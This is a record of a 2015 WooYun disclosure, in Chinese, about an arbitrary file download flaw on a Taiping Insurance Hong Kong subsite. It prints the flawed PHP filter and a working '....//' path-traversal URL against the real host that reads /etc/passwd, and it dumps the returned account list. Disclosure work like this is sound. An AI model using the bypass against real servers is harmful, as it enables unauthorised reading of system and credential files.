{"id": 78143, "wybug_id": "wooyun-2015-0161078", "wybug_title": "太平保险某主站设计缺陷服务器任意文件下载", "wybug_corp": "cntaiping.com", "wybug_author": "j0k3r", "wybug_date": "2015-12-14 09:43", "wybug_open_date": "2016-01-28 17:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "逻辑错误", "设计错误", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向公众公开  简要描述： rt 详细说明：  目标：http://www.hk.cntaiping.com形如，\nhttp://www.hk.cntaiping.com/include/getfile.php?filepath=路径&file=名字+格式&filename=名字\n\n\n\n\n数据库配置信息\n\n----------------------------------------------------------------------------------在include/getfile.php中\n$path = '../';$filepath = str_replace(\"../\", \"\", $filepath);$file = str_replace(\"../\", \"\", $file);if(is_file($path.$filepath.$file)){\t$filerename = $filename;\t$file = $file;\t$path = $path.$filepath;\t$can_download = true;}\n有防止跨目录，但可以绕过，如下\nhttp://www.hk.cntaiping.com/include/getfile.php?filepath=....//....//....//etc/&file=passwd&filename=passwd\n\n\n\nat:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bashbin:x:1:1:bin:/bin:/bin/bashdaemon:x:2:2:Daemon:/sbin:/bin/bashftp:x:40:49:FTP account:/srv/ftp:/bin/bashgames:x:12:100:Games account:/var/games:/bin/bashgdm:x:50:104:Gnome Display Manager daemon:/var/lib/gdm:/bin/falsehaldaemon:x:101:102:User for haldaemon:/var/run/hal:/bin/falselp:x:4:7:Printing daemon:/var/spool/lpd:/bin/bashmail:x:8:12:Mailer daemon:/var/spool/clientmqueue:/bin/falseman:x:13:62:Manual pages viewer:/var/cache/man:/bin/bashmessagebus:x:100:101:User for D-BUS:/var/run/dbus:/bin/falsemysql:x:60:106:MySQL database admin:/var/lib/mysql:/bin/bashnamed:x:44:44:Name server daemon:/var/lib/named:/bin/falsenews:x:9:13:News system:/etc/news:/bin/bashnobody:x:65534:65533:nobody:/var/lib/nobody:/bin/bashntp:x:74:103:NTP daemon:/var/lib/ntp:/bin/falsepostfix:x:51:51:Postfix Daemon:/var/spool/postfix:/bin/falseroot:x:0:0:root:/root:/bin/bashsshd:x:71:65:SSH daemon:/var/lib/sshd:/bin/falsesuse-ncc:x:102:105:Novell Customer Center User:/var/lib/YaST2/suse-ncc-fakehome:/bin/bashuucp:x:10:14:Unix-to-Unix CoPy system:/etc/uucp:/bin/bashwwwrun:x:30:8:WWW daemon apache:/var/lib/wwwrun:/bin/falsewebapp:x:1001:100:webapp:/srv/www/htdocs:/bin/bash\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  你懂的   版权声明：转载请注明来源 j0k3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-12-17 10:50 厂商回复： 网站为子站点，涉及到部分内部信息。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}